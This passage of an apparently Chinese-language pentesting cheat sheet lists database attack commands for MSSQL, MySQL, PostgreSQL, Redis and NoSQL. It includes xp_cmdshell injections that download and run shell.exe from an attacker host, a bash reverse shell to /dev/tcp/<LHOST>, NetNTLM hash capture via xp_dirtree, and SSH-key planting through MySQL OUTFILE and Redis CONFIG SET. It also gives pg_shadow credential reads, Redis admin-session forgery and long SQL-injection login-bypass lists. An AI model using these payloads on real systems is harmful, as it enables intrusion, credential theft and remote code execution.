<h5 id="开放查询"><a href="#开放查询" class="headerlink" title="开放查询"></a>开放查询</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>&gt; select * from <span class="hljs-title function_">openquery</span><span class="hljs-params">(<span class="hljs-string">&quot;web\clients&quot;</span>, <span class="hljs-string">&#x27;select name from master.sys.databases&#x27;</span>)</span>;<br><span class="hljs-number">2</span>&gt; go<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>&gt; select * from <span class="hljs-title function_">openquery</span><span class="hljs-params">(<span class="hljs-string">&quot;web\clients&quot;</span>, <span class="hljs-string">&#x27;select name from clients.sys.objects&#x27;</span>)</span>;<br><span class="hljs-number">2</span>&gt; go<br></code></pre></td></tr></table></figure>

<h5 id="将数据库文件BASE64编码后放入本地TXT文件中"><a href="#将数据库文件BASE64编码后放入本地TXT文件中" class="headerlink" title="将数据库文件BASE64编码后放入本地TXT文件中"></a>将数据库文件BASE64编码后放入本地TXT文件中</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>&gt; select <span class="hljs-title function_">cast</span><span class="hljs-params">((select content from openquery([web\clients], <span class="hljs-string">&#x27;select * from clients.sys.assembly_files&#x27;</span>) where assembly_id = <span class="hljs-number">65536</span>) as varbinary(max))</span> <span class="hljs-keyword">for</span> xml <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-string">&#x27;&#x27;), binary base64;</span></span><br><span class="hljs-string"><span class="hljs-params">2&gt; go &gt; export.txt</span></span><br></code></pre></td></tr></table></figure>

<h5 id="窃取-NetNTLM-Hash-哈希-中继攻击"><a href="#窃取-NetNTLM-Hash-哈希-中继攻击" class="headerlink" title="窃取 NetNTLM Hash 哈希 &#x2F; 中继攻击"></a>窃取 NetNTLM Hash 哈希 &#x2F; 中继攻击</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SQL&gt; exec master.dbo.xp_dirtree <span class="hljs-string">&#x27;\\&lt;LHOST&gt;\FOOBAR&#x27;</span><br></code></pre></td></tr></table></figure>

<h5 id="关联-SQL-服务器枚举"><a href="#关联-SQL-服务器枚举" class="headerlink" title="关联 SQL 服务器枚举"></a>关联 SQL 服务器枚举</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SQL&gt; SELECT <span class="hljs-title function_">user_name</span><span class="hljs-params">()</span>;<br>SQL&gt; SELECT name,sysadmin FROM syslogins;<br>SQL&gt; SELECT srvname,isremote FROM sysservers;<br>SQL&gt; EXEC (<span class="hljs-string">&#x27;SELECT current_user&#x27;</span>) at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;];<br>SQL&gt; EXEC (<span class="hljs-string">&#x27;SELECT srvname,isremote FROM sysservers&#x27;</span>) at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;];<br>SQL&gt; EXEC (<span class="hljs-string">&#x27;EXEC (&#x27;</span><span class="hljs-string">&#x27;SELECT suser_name()&#x27;</span><span class="hljs-string">&#x27;) at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;]&#x27;</span>) at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;];<br></code></pre></td></tr></table></figure>

<h5 id="执行XP-CMDSHELL攻击"><a href="#执行XP-CMDSHELL攻击" class="headerlink" title="执行XP_CMDSHELL攻击"></a>执行XP_CMDSHELL攻击</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SQL&gt; EXEC sp_configure <span class="hljs-string">&#x27;Show Advanced Options&#x27;</span>, <span class="hljs-number">1</span>;<br>SQL&gt; reconfigure;<br>SQL&gt; sp_configure;<br>SQL&gt; EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;<br>SQL&gt; reconfigure<br>SQL&gt; xp_cmdshell <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">SQL&gt; enable_xp_cmdshell<br>SQL&gt; xp_cmdshell whoami<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27;;EXEC master.dbo.xp_cmdshell &#x27;</span>ping &lt;LHOST&gt;<span class="hljs-string">&#x27;;--</span><br><span class="hljs-string">&#x27;</span>;EXEC master.dbo.xp_cmdshell <span class="hljs-string">&#x27;certutil -urlcache -split -f http://&lt;LHOST&gt;/shell.exe C:\\Windows\temp\&lt;FILE&gt;.exe&#x27;</span>;--<br><span class="hljs-string">&#x27;;EXEC master.dbo.xp_cmdshell &#x27;</span>cmd /c C:\\Windows\\temp\\&lt;FILE&gt;.exe<span class="hljs-number">&#x27;</span>;--<br></code></pre></td></tr></table></figure>

<h4 id="MySQL数据库"><a href="#MySQL数据库" class="headerlink" title="MySQL数据库"></a>MySQL数据库</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql -u root -p<br>mysql -u &lt;USERNAME&gt; -h &lt;RHOST&gt; -p<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql&gt; show databases;<br>mysql&gt; use &lt;DATABASE&gt;;<br>mysql&gt; show tables;<br>mysql&gt; describe &lt;TABLE&gt;;<br>mysql&gt; SELECT * FROM Users;<br>mysql&gt; SELECT * FROM users \G;<br>mysql&gt; SELECT Username,Password FROM Users;<br></code></pre></td></tr></table></figure>

<h5 id="更新用户密码"><a href="#更新用户密码" class="headerlink" title="更新用户密码"></a>更新用户密码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql&gt; update user <span class="hljs-built_in">set</span> password = <span class="hljs-string">&#x27;37b08599d3f323491a66feabbb5b26af&#x27;</span> where user_id = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>

<h5 id="执行SHELL命令"><a href="#执行SHELL命令" class="headerlink" title="执行SHELL命令"></a>执行SHELL命令</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql&gt; \! /bin/sh<br></code></pre></td></tr></table></figure>

<h5 id="插入代码并执行"><a href="#插入代码并执行" class="headerlink" title="插入代码并执行"></a>插入代码并执行</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql&gt; insert into <span class="hljs-title function_">users</span> <span class="hljs-params">(id, email)</span> <span class="hljs-title function_">values</span> <span class="hljs-params">(&lt;LPORT&gt;, <span class="hljs-string">&quot;- E $(bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&#x27;)&quot;</span>)</span>;<br></code></pre></td></tr></table></figure>

<h5 id="将SSH密钥写入AUTHORIZED-KEYS2文件"><a href="#将SSH密钥写入AUTHORIZED-KEYS2文件" class="headerlink" title="将SSH密钥写入AUTHORIZED_KEYS2文件"></a>将SSH密钥写入AUTHORIZED_KEYS2文件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mysql&gt; SELECT <span class="hljs-string">&quot;&lt;KEY&gt;&quot;</span> INTO OUTFILE <span class="hljs-string">&#x27;/root/.ssh/authorized_keys2&#x27;</span> FIELDS TERMINATED BY <span class="hljs-string">&#x27;&#x27; OPTIONALLY ENCLOSED BY &#x27;</span><span class="hljs-string">&#x27; LINES TERMINATED BY &#x27;</span>\n<span class="hljs-number">&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h4 id="NoSQL注入"><a href="#NoSQL注入" class="headerlink" title="NoSQL注入"></a>NoSQL注入</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">admin<span class="hljs-number">&#x27;</span>||<span class="hljs-string">&#x27;&#x27;===&#x27;</span><br>&#123;<span class="hljs-string">&quot;username&quot;</span>: &#123;<span class="hljs-string">&quot;$ne&quot;</span>: null&#125;, <span class="hljs-string">&quot;password&quot;</span>: &#123;<span class="hljs-string">&quot;$ne&quot;</span>: null&#125; &#125;<br></code></pre></td></tr></table></figure>

<h4 id="PostgreSQL数据库"><a href="#PostgreSQL数据库" class="headerlink" title="PostgreSQL数据库"></a>PostgreSQL数据库</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">psql<br>psql -h &lt;LHOST&gt; -U &lt;USERNAME&gt; -c <span class="hljs-string">&quot;&lt;COMMAND&gt;;&quot;</span><br>psql -h &lt;RHOST&gt; -p <span class="hljs-number">5432</span> -U &lt;USERNAME&gt; -d &lt;DATABASE&gt;<br>psql -h &lt;RHOST&gt; -p <span class="hljs-number">5432</span> -U &lt;USERNAME&gt; -d &lt;DATABASE&gt;<br></code></pre></td></tr></table></figure>

<h3 id="常用命令-数据库"><a href="#常用命令-数据库" class="headerlink" title="常用命令-数据库"></a>常用命令-数据库</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">postgres=# \<span class="hljs-built_in">list</span>                     <span class="hljs-comment">// 列出所有数据库</span><br>postgres=# \c                        <span class="hljs-comment">// 使用数据库</span><br>postgres=# \c &lt;DATABASE&gt;             <span class="hljs-comment">// 使用特定数据库</span><br>postgres=# \s                        <span class="hljs-comment">// 命令历史记录</span><br>postgres=# \q                        <span class="hljs-comment">// quit</span><br>&lt;DATABASE&gt;=# \dt                     <span class="hljs-comment">// 列出当前架构中的表</span><br>&lt;DATABASE&gt;=# \dt *.*                 <span class="hljs-comment">// 列出所有架构中的表</span><br>&lt;DATABASE&gt;=# \du                     <span class="hljs-comment">// 列出用户角色</span><br>&lt;DATABASE&gt;=# \du+                    <span class="hljs-comment">// 列出用户角色</span><br>&lt;DATABASE&gt;=# SELECT user;            <span class="hljs-comment">// 获取当前用户</span><br>&lt;DATABASE&gt;=# TABLE &lt;TABLE&gt;;          <span class="hljs-comment">// 选择表格</span><br>&lt;DATABASE&gt;=# SELECT * FROM users;    <span class="hljs-comment">// 从用户表中选择所有内容</span><br>&lt;DATABASE&gt;=# SHOW rds.extensions;    <span class="hljs-comment">// 列出已安装的扩展</span><br>&lt;DATABASE&gt;=# SELECT usename, passwd from pg_shadow;    <span class="hljs-comment">// 读取凭据</span><br></code></pre></td></tr></table></figure>

<h4 id="Redis数据库"><a href="#Redis数据库" class="headerlink" title="Redis数据库"></a>Redis数据库</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt; AUTH &lt;PASSWORD&gt;<br>&gt; AUTH &lt;USERNAME&gt; &lt;PASSWORD&gt;<br>&gt; INFO SERVER<br>&gt; INFO keyspace<br>&gt; CONFIG GET *<br>&gt; SELECT &lt;NUMBER&gt;<br>&gt; KEYS *<br>&gt; HSET       <span class="hljs-comment">// 如果哈希数据结构中的字段，则设置值</span><br>&gt; HGET       <span class="hljs-comment">// 从哈希数据结构中检索字段及其值</span><br>&gt; HKEYS      <span class="hljs-comment">// 从哈希数据结构中检索所有字段名</span><br>&gt; HGETALL    <span class="hljs-comment">// 从哈希数据结构中检索所有字段和值</span><br>&gt; GET PHPREDIS_SESSION:<span class="hljs-number">2</span>a9mbvnjgd6i2qeqcubgdv8n4b<br>&gt; SET PHPREDIS_SESSION:<span class="hljs-number">2</span>a9mbvnjgd6i2qeqcubgdv8n4b <span class="hljs-string">&quot;username|s:8:\&quot;&lt;USERNAME&gt;\&quot;;role|s:5:\&quot;admin\&quot;;auth|s:4:\&quot;True\&quot;;&quot;</span> <span class="hljs-meta"># the value <span class="hljs-string">&quot;s:8&quot;</span> has to match the length of the username</span><br></code></pre></td></tr></table></figure>

<h5 id="输入自己的-SSH-密钥"><a href="#输入自己的-SSH-密钥" class="headerlink" title="输入自己的 SSH 密钥"></a>输入自己的 SSH 密钥</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">redis-cli -h &lt;RHOST&gt;<br>echo <span class="hljs-string">&quot;FLUSHALL&quot;</span> | redis-cli -h &lt;RHOST&gt;<br>(echo -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat ~/.ssh/id_rsa.pub; echo -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; /PATH/TO/FILE/&lt;FILE&gt;.txt<br>cat /PATH/TO/FILE/&lt;FILE&gt;.txt | redis-cli -h &lt;RHOST&gt; -x <span class="hljs-built_in">set</span> s-key<br>&lt;RHOST&gt;:<span class="hljs-number">6379</span>&gt; get s-key<br>&lt;RHOST&gt;:<span class="hljs-number">6379</span>&gt; CONFIG GET dir<br><span class="hljs-number">1</span>) <span class="hljs-string">&quot;dir&quot;</span><br><span class="hljs-number">2</span>) <span class="hljs-string">&quot;/var/lib/redis&quot;</span><br>&lt;RHOST&gt;:<span class="hljs-number">6379</span>&gt; CONFIG SET dir /var/lib/redis/.ssh<br>OK<br>&lt;RHOST&gt;:<span class="hljs-number">6379</span>&gt; CONFIG SET dbfilename authorized_keys<br>OK<br>&lt;RHOST&gt;:<span class="hljs-number">6379</span>&gt; CONFIG GET dbfilename<br><span class="hljs-number">1</span>) <span class="hljs-string">&quot;dbfilename&quot;</span><br><span class="hljs-number">2</span>) <span class="hljs-string">&quot;authorized_keys&quot;</span><br>&lt;RHOST&gt;:<span class="hljs-number">6379</span>&gt; save<br>OK<br></code></pre></td></tr></table></figure>

<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><h5 id="主列表"><a href="#主列表" class="headerlink" title="主列表"></a>主列表</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27;;#---              // 到处插入！向xsudoxx大喊！</span><br><span class="hljs-string">admin&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">&quot; or &quot;1&quot;=&quot;1</span><br><span class="hljs-string">&quot; or &quot;1&quot;=&quot;1&quot;--</span><br><span class="hljs-string">&quot; or &quot;1&quot;=&quot;1&quot;/*</span><br><span class="hljs-string">&quot; or &quot;1&quot;=&quot;1&quot;#</span><br><span class="hljs-string">&quot; or 1=1</span><br><span class="hljs-string">&quot; or 1=1 --</span><br><span class="hljs-string">&quot; or 1=1 -</span><br><span class="hljs-string">&quot; or 1=1--</span><br><span class="hljs-string">&quot; or 1=1/*</span><br><span class="hljs-string">&quot; or 1=1#</span><br><span class="hljs-string">&quot; or 1=1-</span><br><span class="hljs-string">&quot;) or &quot;1&quot;=&quot;1</span><br><span class="hljs-string">&quot;) or &quot;1&quot;=&quot;1&quot;--</span><br><span class="hljs-string">&quot;) or &quot;1&quot;=&quot;1&quot;/*</span><br><span class="hljs-string">&quot;) or &quot;1&quot;=&quot;1&quot;#</span><br><span class="hljs-string">&quot;) or (&quot;1&quot;=&quot;1</span><br><span class="hljs-string">&quot;) or (&quot;1&quot;=&quot;1&quot;--</span><br><span class="hljs-string">&quot;) or (&quot;1&quot;=&quot;1&quot;/*</span><br><span class="hljs-string">&quot;) or (&quot;1&quot;=&quot;1&quot;#</span><br><span class="hljs-string">) or &#x27;</span><span class="hljs-number">1</span>`=<span class="hljs-string">&#x27;1-</span><br></code></pre></td></tr></table></figure>

<h5 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&#x27;-&#x27;</span><br><span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-string">&#x27;&amp;&#x27;</span><br><span class="hljs-string">&#x27;^&#x27;</span><br><span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-string">&#x27; or 1=1 limit 1 -- -+</span><br><span class="hljs-string">&#x27;</span>=<span class="hljs-string">&quot;or&#x27;</span><br><span class="hljs-string">&#x27; or &#x27;&#x27;-&#x27;</span><br><span class="hljs-string">&#x27; or &#x27;&#x27; &#x27;</span><br><span class="hljs-string">&#x27; or &#x27;&#x27;&amp;&#x27;</span><br><span class="hljs-string">&#x27; or &#x27;&#x27;^&#x27;</span><br><span class="hljs-string">&#x27; or &#x27;&#x27;*&#x27;</span><br><span class="hljs-string">&#x27;-||0&#x27;</span><br><span class="hljs-string">&quot;</span>-||<span class="hljs-number">0</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>-<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>&amp;<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>^<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>*<span class="hljs-string">&quot;</span><br><span class="hljs-string">&#x27;--&#x27;</span><br><span class="hljs-string">&quot;</span>--<span class="hljs-string">&quot;</span><br><span class="hljs-string">&#x27;--&#x27; / &quot;</span>--<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span> or <span class="hljs-string">&quot;&quot;</span>-<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span> or <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span> or <span class="hljs-string">&quot;&quot;</span>&amp;<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span> or <span class="hljs-string">&quot;&quot;</span>^<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span> or <span class="hljs-string">&quot;&quot;</span>*<span class="hljs-string">&quot;</span><br><span class="hljs-string">or true--</span><br><span class="hljs-string">&quot;</span> or <span class="hljs-literal">true</span>--<br><span class="hljs-string">&#x27; or true--</span><br><span class="hljs-string">&quot;) or true--</span><br><span class="hljs-string">&#x27;</span>) or <span class="hljs-literal">true</span>--<br><span class="hljs-string">&#x27; or &#x27;</span>x<span class="hljs-number">&#x27;</span>=<span class="hljs-string">&#x27;x</span><br><span class="hljs-string">&#x27;</span>) or (<span class="hljs-string">&#x27;x&#x27;</span>)=(<span class="hljs-string">&#x27;x</span><br><span class="hljs-string">&#x27;</span>)) or ((<span class="hljs-string">&#x27;x&#x27;</span>))=((<span class="hljs-string">&#x27;x</span><br><span class="hljs-string">&quot; or &quot;x&quot;=&quot;x</span><br><span class="hljs-string">&quot;) or (&quot;x&quot;)=(&quot;x</span><br><span class="hljs-string">&quot;)) or ((&quot;x&quot;))=((&quot;x</span><br><span class="hljs-string">or 2 like 2</span><br><span class="hljs-string">or 1=1</span><br><span class="hljs-string">or 1=1--</span><br><span class="hljs-string">or 1=1#</span><br><span class="hljs-string">or 1=1/*</span><br><span class="hljs-string">admin&#x27;</span> --<br>admin<span class="hljs-number">&#x27;</span> -- -<br>admin<span class="hljs-number">&#x27;</span> <span class="hljs-meta">#</span><br><span class="hljs-meta">admin<span class="hljs-string">&#x27;/*</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span> or <span class="hljs-string">&#x27;2&#x27;</span> LIKE <span class="hljs-string">&#x27;1</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span> or 2 LIKE 2--</span><br>admin<span class="hljs-number">&#x27;</span> or <span class="hljs-number">2</span> LIKE <span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-meta">admin<span class="hljs-string">&#x27;) or 2 LIKE 2#</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span>) or 2 LIKE 2--</span><br>admin<span class="hljs-number">&#x27;</span>) or (<span class="hljs-string">&#x27;2&#x27;</span> LIKE <span class="hljs-string">&#x27;2</span><br><span class="hljs-string">admin&#x27;</span>) or (<span class="hljs-string">&#x27;2&#x27;</span> LIKE <span class="hljs-string">&#x27;2&#x27;</span><span class="hljs-meta">#</span><br><span class="hljs-meta">admin<span class="hljs-string">&#x27;) or (&#x27;</span>2<span class="hljs-string">&#x27; LIKE &#x27;</span>2<span class="hljs-string">&#x27;/*</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--</span><br>admin<span class="hljs-number">&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-meta">#</span><br><span class="hljs-meta">admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<span class="hljs-string">&#x27;/*</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span>or 1=1 or <span class="hljs-string">&#x27;&#x27;=&#x27;</span></span><br>admin<span class="hljs-number">&#x27;</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br>admin<span class="hljs-number">&#x27;</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span>--<br>admin<span class="hljs-number">&#x27;</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-meta">admin<span class="hljs-string">&#x27; or 1=1/*</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span>) or (<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span>) or (<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--</span><br>admin<span class="hljs-number">&#x27;</span>) or (<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-meta">#</span><br><span class="hljs-meta">admin<span class="hljs-string">&#x27;) or (&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<span class="hljs-string">&#x27;/*</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span>) or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span>) or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--</span><br>admin<span class="hljs-number">&#x27;</span>) or <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-meta">#</span><br><span class="hljs-meta">admin<span class="hljs-string">&#x27;) or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<span class="hljs-string">&#x27;/*</span></span><br><span class="hljs-string"><span class="hljs-meta">1234 &#x27;</span> AND 1=0 UNION ALL SELECT <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;81dc9bdb52d04dc20036dbd8313ed055</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&quot; --</span></span><br><span class="hljs-string"><span class="hljs-meta">admin&#x27;</span>;-- azer</span><br>admin<span class="hljs-string">&quot; #</span><br><span class="hljs-string">admin&quot;</span><span class="hljs-comment">/*</span><br><span class="hljs-comment">admin&quot; or &quot;1&quot;=&quot;1</span><br><span class="hljs-comment">admin&quot; or &quot;1&quot;=&quot;1&quot;--</span><br><span class="hljs-comment">admin&quot; or &quot;1&quot;=&quot;1&quot;#</span><br><span class="hljs-comment">admin&quot; or &quot;1&quot;=&quot;1&quot;/*</span><br><span class="hljs-comment">admin&quot;or 1=1 or &quot;&quot;=&quot;</span><br><span class="hljs-comment">admin&quot; or 1=1</span><br><span class="hljs-comment">admin&quot; or 1=1--</span><br><span class="hljs-comment">admin&quot; or 1=1#</span><br><span class="hljs-comment">admin&quot; or 1=1/*</span><br><span class="hljs-comment">admin&quot;) or (&quot;1&quot;=&quot;1</span><br><span class="hljs-comment">admin&quot;) or (&quot;1&quot;=&quot;1&quot;--</span><br><span class="hljs-comment">admin&quot;) or (&quot;1&quot;=&quot;1&quot;#</span><br><span class="hljs-comment">admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*</span><br><span class="hljs-comment">admin&quot;) or &quot;1&quot;=&quot;1</span><br><span class="hljs-comment">admin&quot;) or &quot;1&quot;=&quot;1&quot;--</span><br><span class="hljs-comment">admin&quot;) or &quot;1&quot;=&quot;1&quot;#</span><br><span class="hljs-comment">admin&quot;) or &quot;1&quot;=&quot;1&quot;/*</span><br><span class="hljs-comment">1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055</span><br></code></pre></td></tr></table></figure>

